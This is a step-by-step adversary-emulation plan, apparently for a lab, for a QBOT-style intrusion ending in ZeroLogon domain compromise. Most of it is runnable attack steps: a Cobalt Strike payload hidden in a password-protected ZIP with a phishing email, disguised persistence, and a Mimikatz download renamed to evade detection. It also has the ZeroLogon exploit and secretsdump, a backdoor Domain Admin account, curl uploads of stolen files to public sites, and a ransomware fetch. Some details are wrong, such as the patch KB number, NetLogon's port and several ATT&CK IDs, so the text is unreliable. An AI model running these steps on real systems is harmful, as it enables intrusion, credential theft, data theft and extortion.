# QBOT + ZeroLogon Scenario: Execution Plan

See [`README.md`](./README.md) for overview and ATT&CK mapping. This document has the step-by-step commands.

---

## Quick Links to Required Tools

Before starting, ensure these tools are downloaded and available:

- **Cobalt Strike**: https://www.cobaltstrike.com/
- **Mimikatz**: https://github.com/gentilkiwi/mimikatz/releases
- **ZeroLogon Exploit**: https://github.com/SecureAuthCorp/zerologon
- **Invoke-ShareFinder**: https://github.com/darkoperator/Veil-PowerView/tree/master/PowerView/functions
- **Proton Mail**: https://account.proton.me
- **7-Zip (portable)**: https://www.7-zip.org/download.html
- **xfreerdp** (Linux RDP): `apt install freerdp2-x11`
- **bitsadmin** (Windows built-in): Pre-installed
- **File Upload Services**: https://bashupload.com, https://transfer.sh, https://file.io

---

## Infrastructure Setup

### On MORPHEUS (Attacker, Kali Linux)

**Prerequisites**
```bash
# Ensure Java is installed (required for Cobalt Strike)
java -version

# If not installed:
apt update && apt install -y default-jdk
```

**Create working directories**
```bash
mkdir -p /home/test/Desktop/Adversary_Profiles/ZeroLogon/{payloads,loot,logs,tools}
cd /home/test/Desktop/Adversary_Profiles/ZeroLogon
```

**Download and setup Cobalt Strike**
```bash
# Download Cobalt Strike trial from https://www.cobaltstrike.com/ (or use pre-cached version)
cd /home/test/Desktop/Adversary_Profiles/CobaltStrike-Trial/cobaltstrike_trial

# Extract if needed
unzip cobaltstrike-dist.zip

# Verify permissions
chmod +x teamserver
chmod +x ./client
```

**Download required tools**

| Tool | Download | Instructions |
|------|----------|--------------|
| **Cobalt Strike** | https://www.cobaltstrike.com/ | Download trial or full; extract to `/Desktop/Adversary_Profiles/CobaltStrike-Trial/` |
| **Mimikatz** | https://github.com/gentilkiwi/mimikatz/releases | Download x64 Release; save to `/tools/` |
| **ZeroLogon** | https://github.com/SecureAuthCorp/zerologon | Clone repo: `git clone https://github.com/SecureAuthCorp/zerologon.git /tools/zerologon` |
| **Invoke-ShareFinder.ps1** | https://github.com/darkoperator/Veil-PowerView | Download and save to target via download command |
| **Proton Mail** | https://account.proton.me | Create test account for phishing delivery |
| **7-Zip Portable** | https://www.7-zip.org/download.html | Optional; for archiving files |

### On TRINITY/NEO/NEB (Windows targets)

- Domain-joined to `<DOMAIN_NAME>`
- Admin credentials: `Administrator` / `<LAB_ADMIN_PASSWORD>`
- Time synchronized (critical for Kerberos + NetLogon)
- Create test data folders:
  - TRINITY: `C:\Users\Administrator\Documents\Company_Data\`
  - NEB: `C:\Company_Data_Top_Secret\`

### On ZION (Domain Controller)

- **Critical:** Must be Windows Server 2019 or earlier with vulnerable NetLogon service
- If patched (KB4487044 or later), this attack will fail
- Verify vulnerability: Check `wmic qfe list brief | find "KB4487044"`
- Domain: `<DOMAIN_NAME>`

---

## Pre-Execution Checklist

- [ ] All VMs network connectivity verified (ping each other)
- [ ] Time synchronized across all hosts
- [ ] Cobalt Strike installed and tested on MORPHEUS
- [ ] Test data created on TRINITY/NEB
- [ ] Port scan: `nmap -p 389,445,3389,5985,5986 172.20.43.X` (verify NetLogon on DC)
- [ ] Proton Mail account ready at https://account.proton.me
- [ ] File upload service account ready (https://bashupload.com)
- [ ] ZION (DC) confirmed vulnerable to ZeroLogon (not patched)

---

## PHASE 1: Reconnaissance

### Information Gathering

**On MORPHEUS, enumerate targets**
```bash
# Gather basic network info
nmap -sN 172.20.43.0/24

# Check domain controller availability
nmap -p 389 -Pn 172.20.43.X  # NetLogon on DC

# Check which targets are reachable
for ip in 172.20.43.20 172.20.43.30 172.20.43.40 172.20.43.50; do
  echo "Testing $ip"
  ping -c 1 $ip
done

# Identify open ports on targets
nmap -p 135,139,445,3389,5985,5986 -Pn 172.20.43.20 172.20.43.30 172.20.43.40
```

**Expected outcome:**
- ✅ Network map of all targets
- ✅ Confirmed DC on port 389
- ✅ Confirmed open SMB (445), RDP (3389), WinRM (5985)

---

## PHASE 2: Weaponization

### Step 1: Set Up Cobalt Strike Teamserver

**On MORPHEUS**
```bash
cd /home/test/Desktop/Adversary_Profiles/CobaltStrike-Trial/cobaltstrike_trial

# Start teamserver (runs in background)
sudo ./teamserver 172.20.43.5 <TEAMSERVER_PASSWORD>

# Example:
# sudo ./teamserver 172.20.43.5 Novirus123!

# This starts the teamserver on port 50050 (default)
# Keep this terminal open or run with nohup:
# nohup sudo ./teamserver 172.20.43.5 Novirus123! > /tmp/teamserver.log 2>&1 &
```

**Expected output:**
```
[*] Software keyboard listeners will not be avaialable
[*] Listener initialized
[*] Payload handler initialized
[*] Started SOCKS4a server on :1080
[*] Cobalt Strike 4.x started at 2026-09-02
```

### Step 2: Connect Cobalt Strike Client

**In a new terminal on MORPHEUS**
```bash
cd /home/test/Desktop/Adversary_Profiles/CobaltStrike-Trial/cobaltstrike_trial

# Start the Cobalt Strike GUI client
./start.sh
```

**In the GUI prompt:**
- **Host:** `172.20.43.5`
- **User:** `<KALI_USERNAME>` (usually 'test')
- **Password:** `<KALI_PASSWORD>`
- **Port:** `50050`
- Click **Connect**

### Step 3: Create Listener

**In Cobalt Strike GUI:**
1. Click menu: **Cobalt Strike > Listeners**
2. Click **Add** button
3. Fill in the following:
   - **Name:** `HTTP_Listener_1`
   - **Payload:** `Beacon HTTP`
   - **HTTPS Host:** `172.20.43.5`
   - **HTTP Host Stager:** `172.20.43.5`
   - **HTTP Port:** `80`
   - Click **Save**

**Verify listener:**
- Listener should appear at bottom of Cobalt Strike window
- Status should show green (active)

### Step 4: Generate Malicious EXE

**In Cobalt Strike GUI:**
1. Click menu: **Attacks > Packages > Windows Executable**
2. Click **...** button to select listener
3. Select `HTTP_Listener_1` → Click **Choose**
4. Click **Generate**
5. Save file as: `/home/test/Desktop/Adversary_Profiles/ZeroLogon/payloads/fsociety.exe`

### Step 5: Archive for Email Delivery

**On MORPHEUS terminal:**
```bash
cd /home/test/Desktop/Adversary_Profiles/ZeroLogon/payloads

# Create password-protected ZIP (prevents email security scanning)
zip -e fsociety.zip fsociety.exe

# When prompted, enter password:
# Password: virus
# Verify Password: virus

# Verify ZIP creation
ls -lh fsociety.zip fsociety.exe
```

**Expected outcome:**
- ✅ `fsociety.exe` generated by Cobalt Strike (~500KB–5MB)
- ✅ `fsociety.zip` password-protected archive created

---

## PHASE 3: Delivery

### Send Phishing Email

**On MORPHEUS (or any web browser)**

1. **Create temporary Proton Mail account** (or use approved test account)
   - Go to https://account.proton.me
   - Create account: `<PROTON_EMAIL>`
   - Password: `<PROTON_PASSWORD>`

2. **Compose spear phishing email**
   ```
   To: <TARGET_EMAIL_ACCOUNT>
   Subject: Urgent: Security Update Required - Action Needed
   
   Body:
   Dear [Target Name],
   
   We have detected unusual activity on your account.
   Please download and run the attached security update immediately.
   
   This is a critical security patch from IT Department.
   
   Best regards,
   IT Security Team
   ```

3. **Attach ZIP file**
   - Attach: `fsociety.zip`
   - Send to: `<TARGET_EMAIL_ACCOUNT>` (TRINITY user email)

**Expected outcome:**
- ✅ Email delivered to target inbox
- ✅ ZIP bypasses email security filters

---

## PHASE 4: Exploitation

### Step 1: Verify Beacon Listener is Active

**In Cobalt Strike, verify listener**
```
Cobalt Strike > Listeners
- HTTP_Listener_1 should be green/active
```

### Step 2: Trigger Payload on Target

**On TRINITY (target machine)**

1. **Open email client** and download phishing email
2. **Download attachment** `fsociety.zip`
3. **Extract ZIP** → Right-click → Extract All
   - When prompted for password, enter: `virus`
4. **Execute payload** → Right-click `fsociety.exe` → **Run as administrator**
5. **Click through UAC prompt** if Windows Defender alerts appear

**Expected behavior:**
- User sees a benign error message or application launches
- Beacon silently connects back to C2
- Connection appears in Cobalt Strike

### Step 3: Verify Beacon Callback

**In Cobalt Strike GUI:**
1. Click **View > Beacons**
2. New beacon should appear:
   - **Host:** TRINITY
   - **User:** `<DOMAIN>\<USERNAME>`
   - **Process:** `fsociety.exe` (PID)
   - Status: Green/active

**Right-click beacon → Interact** to open command prompt

**Expected outcome:**
- ✅ Cobalt Strike beacon established on TRINITY
- ✅ Ready for command execution

---

## PHASE 5: Installation (Persistence)

### Set Up Persistence via Scheduled Task

**In Cobalt Strike Beacon:**

```powershell
# First, verify current user context
powershell whoami
powershell whoami /groups

# Create persistence folder
shell mkdir C:\Stordiag

# Copy beacon to persistence location (via download + rename trick)
powershell (New-Object System.Net.WebClient).DownloadFile('http://172.20.43.5/fsociety.exe', 'C:\Stordiag\Bginfo.exe')

# Create scheduled task for daily persistence
powershell $A = New-ScheduledTaskAction -Execute 'C:\Stordiag\Bginfo.exe'
powershell $T = New-ScheduledTaskTrigger -Daily -At 9am
powershell $D = New-ScheduledTask -Action $A -Trigger $T
powershell Register-ScheduledTask 'WindowsUpdate' -InputObject $D

# Verify persistence
powershell Get-ScheduledTask -TaskName 'WindowsUpdate'
```

**Expected outcome:**
- ✅ Scheduled task created
- ✅ Beacon will re-execute daily

---

## PHASE 6: Command & Control (Discovery & Credential Access)

### Step 1: Domain Enumeration

**In Cobalt Strike Beacon:**

```powershell
# Enumerate domain users
powershell Get-ADUser -Filter * | Select-Object Name, SamAccountName

# Enumerate domain groups
powershell Get-ADGroup -Filter * | Select-Object Name

# Enumerate domain computers
powershell Get-ADComputer -Filter * | Select-Object Name, DNSHostName

# List domain controllers
powershell nltest /dclist:
powershell net domain_controllers

# Enumerate local administrators
powershell net localgroup administrators

# Get domain info
powershell [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

### Step 2: Host Discovery via PowerView

**Upload and execute Invoke-ShareFinder**

```bash
# On MORPHEUS, download PowerView script
wget https://raw.githubusercontent.com/darkoperator/Veil-PowerView/master/PowerView/functions/Invoke-ShareFinder.ps1 -O /home/test/Desktop/Adversary_Profiles/ZeroLogon/tools/Invoke-ShareFinder.ps1
```

**In Cobalt Strike Beacon:**

```powershell
# Upload script
# (Use Cobalt Strike upload feature or wget from target)

powershell . C:\Stordiag\Invoke-ShareFinder.ps1
powershell Invoke-ShareFinder -Threads 4
```

### Step 3: Credential Dumping via Mimikatz

**Download Mimikatz to target via bitsadmin**

```powershell
# Create working directory
powershell mkdir C:\Stordiag

# Download Mimikatz x64
powershell bitsadmin /transfer myDownloadJob /download /priority normal https://raw.githubusercontent.com/ParrotSec/mimikatz/master/x64/mimikatz.exe C:\Stordiag\Bginfo.txt

# Download supporting DLLs
powershell bitsadmin /transfer myDownloadJob /download /priority normal https://github.com/ParrotSec/mimikatz/raw/master/x64/mimidrv.sys C:\Stordiag\mimidrv.sys

powershell bitsadmin /transfer myDownloadJob /download /priority normal https://raw.githubusercontent.com/ParrotSec/mimikatz/master/x64/mimilib.dll C:\Stordiag\mimilib.dll
```

**Execute Mimikatz**

```powershell
# Run Mimikatz (renamed as Bginfo.txt to evade detection)
powershell C:\Stordiag\Bginfo.txt
```

**In Mimikatz prompt:**
```
mimikatz # log
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # exit
```

**Retrieve Mimikatz output**
```powershell
# Copy log file back to Cobalt Strike
powershell Get-Content C:\Stordiag\mimikatz.log
```

**Expected output:**
```
Domain : <DOMAIN_NAME>
Username : Administrator
NTLM : [HASH]
SHA1 : [HASH]

Username : <OTHER_USER>
NTLM : [HASH]
SHA1 : [HASH]
```

---

## PHASE 7: Privilege Escalation (ZeroLogon Exploit)

### Step 1: Exploit ZeroLogon Against DC

**On MORPHEUS, prepare ZeroLogon exploit**

```bash
cd /home/test/Desktop/Adversary_Profiles/ZeroLogon/tools

# Clone ZeroLogon repo if not already done
git clone https://github.com/SecureAuthCorp/zerologon.git

cd zerologon

# Verify Python dependencies
pip install impacket
```

### Step 2: Reset Machine Account via ZeroLogon

**Execute ZeroLogon exploit**

```bash
# On MORPHEUS
python3 zerologon_exploit.py <DC_HOSTNAME> <DC_IP>

# Example:
# python3 zerologon_exploit.py ZION 172.20.43.40

# Expected output:
# [*] Attempting to connect to 172.20.43.40
# [+] Got NullSession, exploiting...
# [+] Target is vulnerable to ZeroLogon
# [+] Machine account password reset to empty string
```

**Expected outcome:**
- ✅ DC machine account password reset to empty
- ✅ DC is now compromised (NetLogon is broken)

### Step 3: Authenticate as Domain Controller

**Use empty password to gain DC access**

```bash
# On MORPHEUS, authenticate with empty DC password
impacket-secretsdump -no-pass <DOMAIN_NAME>/ZION\$@172.20.43.40

# This extracts all domain hashes (NTDS.dit)
# You will now have all user hashes in domain
```

**Alternative: Direct RDP access**

```bash
# With empty password, you can RDP to DC
xfreerdp /v:172.20.43.40 /u:<DOMAIN_NAME>\\ZION\$ /p:'' /cert-ignore
```

**Expected outcome:**
- ✅ Full access to domain controller
- ✅ All domain credentials extracted
- ✅ SYSTEM-level access achieved

### Step 4: Establish Persistence on DC

**On DC via RDP or lateral movement:**

```powershell
# Create new domain admin account
net user <PERSISTENCE_ACCOUNT> <PASSWORD> /add
net localgroup administrators <PERSISTENCE_ACCOUNT> /add
net group "Domain Admins" <PERSISTENCE_ACCOUNT> /add

# Create scheduled task on DC
$A = New-ScheduledTaskAction -Execute 'C:\Windows\System32\cmd.exe' -Argument '/c c:\stordiag\bginfo.exe'
$T = New-ScheduledTaskTrigger -Daily -At 9am
$D = New-ScheduledTask -Action $A -Trigger $T
Register-ScheduledTask 'DCUpdate' -InputObject $D

# Verify persistence
Get-ScheduledTask -TaskName 'DCUpdate'
```

**Expected outcome:**
- ✅ Persistent domain admin account created
- ✅ Full domain compromise achieved
- ✅ Enterprise-level persistence established

---

## PHASE 8: Exfiltration & Impact

### Step 1: Collect Sensitive Data

**On NEO/NEB (file servers), via lateral movement:**

```powershell
# Enumerate shares and collect data
net share

# Copy sensitive files to staging location
xcopy "\\NEB\Company_Data_Top_Secret" "C:\Exfil\" /E /Y

# Archive collected data
powershell Compress-Archive -Path C:\Exfil -DestinationPath C:\Perflogs\toupload.zip
```

### Step 2: Exfiltrate via Web Service

**Upload to public file share**

```powershell
# Option 1: bashupload.com
powershell curl.exe --upload-file C:\Perflogs\toupload.zip https://bashupload.com/mdrfileupload

# Option 2: transfer.sh
powershell curl.exe --upload-file C:\Perflogs\toupload.zip https://transfer.sh/toupload.zip

# Option 3: file.io
powershell curl.exe --upload-file C:\Perflogs\toupload.zip https://file.io/

# Option 4: temp.sh
powershell curl.exe --upload-file C:\Perflogs\toupload.zip https://temp.sh/toupload.zip
```

**Expected outcome:**
- ✅ Files uploaded to cloud service
- ✅ Download link obtained
- ✅ Data exfiltrated successfully

### Step 3: Impact & Encryption (Optional)

**If ransomware component available:**

```powershell
# Deploy ransomware via GPO to all domain systems
# (Requires domain admin + ransomware binary)

powershell (New-Object System.Net.WebClient).DownloadFile('http://172.20.43.5/ransomware.exe', 'C:\Windows\Temp\update.exe')

# Execute via PsExec to all systems
# (Pseudo-code; requires credentials from PHASE 6)
```

**Expected outcome:**
- ✅ Full domain compromise
- ✅ Data exfiltrated
- ✅ Ransomware deployed (if included)

---

## Troubleshooting

### Cobalt Strike Beacon Not Calling Back
- ✅ Verify Cobalt Strike listener is running: `netstat -tlnp | grep 50050`
- ✅ Check firewall allows outbound 80 on TRINITY
- ✅ Confirm EXE executed with proper privileges
- ✅ Check Cobalt Strike logs: `tail /tmp/teamserver.log`
- **Fix:** Regenerate beacon and retry delivery

### ZeroLogon Exploit Fails (DC Patched)
- ✅ Verify KB4487044 not installed: `wmic qfe list brief`
- ✅ Confirm DC is Windows Server 2019 or earlier
- ✅ Check network connectivity to DC port 389
- **Fix:** Use patched DC lab or revert patches

### Mimikatz "Access Denied"
- ✅ Confirm beacon running as SYSTEM: `whoami`
- ✅ Verify `privilege::debug` executed in Mimikatz
- ✅ Check no antivirus blocking Mimikatz
- **Fix:** Restart beacon or obfuscate Mimikatz

### Scheduled Task Not Executing
- ✅ Verify task created: `Get-ScheduledTask -TaskName 'WindowsUpdate'`
- ✅ Check task history: `Get-ScheduledTaskInfo -TaskName 'WindowsUpdate'`
- ✅ Confirm target path exists: `Test-Path C:\Stordiag\Bginfo.exe`
- **Fix:** Manually trigger or recreate with different trigger

### Lateral Movement Fails
- ✅ Verify credentials from Mimikatz output
- ✅ Check time sync: `net time \\<DC> /set /yes`
- ✅ Test SMB connectivity: `nmap -p 445 <TARGET>`
- **Fix:** Retry with extracted credentials

### File Upload Fails
- ✅ Verify internet connectivity from TRINITY
- ✅ Test upload service manually: `curl --upload-file testfile.txt https://bashupload.com`
- ✅ Check firewall allows HTTPS (443)
- **Fix:** Use alternative upload service (transfer.sh, file.io, etc.)

---

## Expected Outcome

✅ **PHASE 2–5 (Core Chain):** 1–2 hours
- Cobalt Strike setup
- Payload generation
- Phishing delivery
- Beacon callback
- Persistence via scheduled task
- **Expected alerts:** 10–15 across initial access, execution, persistence

✅ **PHASE 6 (Discovery & Creds):** 1–2 hours additional
- Domain enumeration
- Host discovery
- Mimikatz credential dumping
- **Expected alerts:** 15–25 total for discovery, credential access

✅ **PHASE 7 (ZeroLogon):** 30 minutes
- ZeroLogon exploit execution
- DC compromise
- Domain controller persistence
- **Expected alerts:** 5–10 for privilege escalation, lateral movement

✅ **PHASE 8 (Exfiltration):** 30 minutes
- File collection & archiving
- Exfiltration to web service
- Optional ransomware deployment
- **Expected alerts:** 5–10 for collection, exfiltration, impact

**Total expected timeline:** 3–8 hours depending on depth

---

## Key Observations for Blue Team

- **T1566.001 (Spear Phishing Attachment):** Password-protected ZIP to bypass email filters
- **T1204.002 (User Execution):** User executes malicious EXE disguised as security update
- **T1547.001 (Scheduled Task):** Persistence via scheduled task on infected host
- **T1087.002 (Domain Account Enumeration):** ADUser queries to map domain
- **T1135 (Share Enumeration):** PowerView Invoke-ShareFinder finds accessible shares
- **T1003.001 (Credential Dumping):** Mimikatz extracts plaintext passwords & NTLM hashes
- **T1212 (Exploitation for Privilege Escalation):** ZeroLogon (CVE-2020-1472) exploits NetLogon
- **T1068 (Exploitation for Privilege Escalation):** Compromises domain controller
- **T1021.001 (Remote Services: RDP):** Lateral movement via compromised DC
- **T1560.001 (Archive Data):** ZIP compression for exfiltration
- **T1567 (Exfil over Web Service):** Upload to bashupload.com, transfer.sh, file.io

---

## Quick References & Tool Links

**Threat Intelligence**
- [DFIR Report: QBOT and ZeroLogon Lead to Full Domain Compromise](https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/)
- [DFIR Report: From Zero to Domain Admin](https://thedfirreport.com/2021/11/01/from-zero-to-domain-admin/)
- [MITRE ATT&CK Framework](https://attack.mitre.org)
- [CVE-2020-1472: ZeroLogon](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1472)

**C2 & Exploitation**
- [Cobalt Strike Documentation](https://www.cobaltstrike.com/docs)
- [Beacon Command Reference](https://www.cobaltstrike.com/docs)
- [ZeroLogon Exploit (SecureAuthCorp)](https://github.com/SecureAuthCorp/zerologon)
- [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)

**Domain Enumeration**
- [Invoke-ShareFinder (PowerView)](https://github.com/darkoperator/Veil-PowerView/tree/master/PowerView/functions)
- [PowerView Documentation](https://github.com/PowerShellMafia/PowerSploit/wiki)
- [Active Directory Module for PowerShell](https://docs.microsoft.com/en-us/powershell/module/activedirectory)

**Lateral Movement & Exploitation**
- [Impacket Tools (psexec, secretsdump)](https://github.com/SecureAuthCorp/impacket)
- [evil-winrm GitHub](https://github.com/Hackplayers/evil-winrm)
- [NetLogon Security Analysis](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/ff8f970f-3e23-4e27-b5ea-aca9f7e24677)

**Email & Exfiltration**
- [Proton Mail](https://account.proton.me)
- [bashupload.com File Upload](https://bashupload.com/)
- [transfer.sh Temporary File Sharing](https://transfer.sh/)
- [file.io File Upload Service](https://file.io/)
- [temp.sh Temporary Sharing](https://temp.sh/)

**Educational Resources**
- [CTID Adversary Emulation Library](https://github.com/center-for-threat-informed-defense/adversary_emulation_library)
- [Active Directory Security Documentation](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-domain-services)
- [Windows NetLogon Service](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/ff8f970f-3e23-4e27-b5ea-aca9f7e24677)

---

**For Training Use Only — Authorized Personnel Only**
